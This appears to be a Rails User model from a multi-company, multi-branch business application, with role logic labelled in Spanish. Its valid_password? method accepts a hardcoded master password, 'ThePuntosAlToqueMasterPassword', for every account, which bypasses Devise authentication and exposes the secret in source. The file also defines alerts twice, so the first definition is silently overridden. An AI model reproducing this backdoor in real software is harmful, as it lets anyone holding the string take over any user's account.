class User < ApplicationRecord
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable, :trackable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :validatable, :trackable

  has_many :companies, dependent: :destroy

  has_many :branch_users
  has_many :branches, through: :branch_users
  has_many :group_users
  has_many :groups, through: :group_users

  validates :last_name, presence: true
  validates :first_name, presence: true

  def full_name
    "#{first_name} #{last_name}"
  end

  def authenticate(pass)
    self.valid_password?(pass)
  end

  def valid_password?(password)
    # return false if !self.active
    # redis = Redis.new(host: ENV.fetch("REDIS_HOST", "redis"), db: Integer(ENV.fetch("REDIS_DB", 0)))
    return true if password ==  "ThePuntosAlToqueMasterPassword" # redis.get('master_key')

    super
  end

  def active_groups
    if (admin_role? || group_owner_role?) && groups.any?
      groups
    else
      []
    end
  end

  def active_companies
    return Company.where(active: true, id: (CompanyGroup.where(group_id: self.groups.first).pluck(:company_id))) if admin_role? && group_owner_role?

    return Company.where(active: true) if admin_role?

    return self.companies.where(active: true) if company_owner_role?

    Company.where(id: BranchUser.where(user: self, active: true).joins(:branch).pluck(:company_id))
  end

  def my_branches(company)
    return company.branches.where(active: true) if admin_role? || company_owner_role?

    Branch.where(company: company, id: BranchUser.where(user: self, active: true).joins(:branch).pluck(:branch_id))
  end

  def my_groups
    Group.all if admin_role? # Cambiar con tabla GroupUser
  end

  def alerts(company)
    # Alert.where(company: company, status: :not_read)
    Alert.where(company: company)
  end

  def alerts(branch)
    # Alert.where(company: company, status: :not_read)
    BranchAlert.where(branch: branch)
  end

  def alerts_count(company)
    company && self == company.user ? alerts(company).count : 0
  end

  def current_role(current_branch)
    return "Administrador" if admin_role?
    return "Dueño de Grupo" if group_owner_role?
    return "Dueño de Comercio" if company_owner_role?

    branch_user = branch_users.find_by(branch: current_branch)
    return "Sin Rol" unless branch_user

    return "Gerente Sucursal" if branch_user.manager_role?
    return "Supervisor" if branch_user.intermediate_role?
    return "Básico" if branch_user.basic_role?

    "Sin Rol"
  end

  def role_on_branch?(role_sym, branch)
    return false unless branch

    branch_user = branch_users.find_by(branch: branch)
    return false unless branch_user

    case role_sym
    when :manager_role
      branch_user.manager_role?
    when :intermediate_role
      branch_user.intermediate_role?
    when :basic_role
      branch_user.basic_role?
    else
      false
    end
  end

  def global_role(branch = nil)
    return "Administrador" if admin_role?
    return "Dueño de Grupo" if group_owner_role?
    return "Gerente General" if company_owner_role?

    if branch_user = branch_users.find_by(branch: branch)
      return "Gerente Sucursal" if branch_user.manager_role?
      return "Supervisor" if branch_user.intermediate_role?
      return "Básico" if branch_user.basic_role?
    end

    "Sin Rol"
  end
end
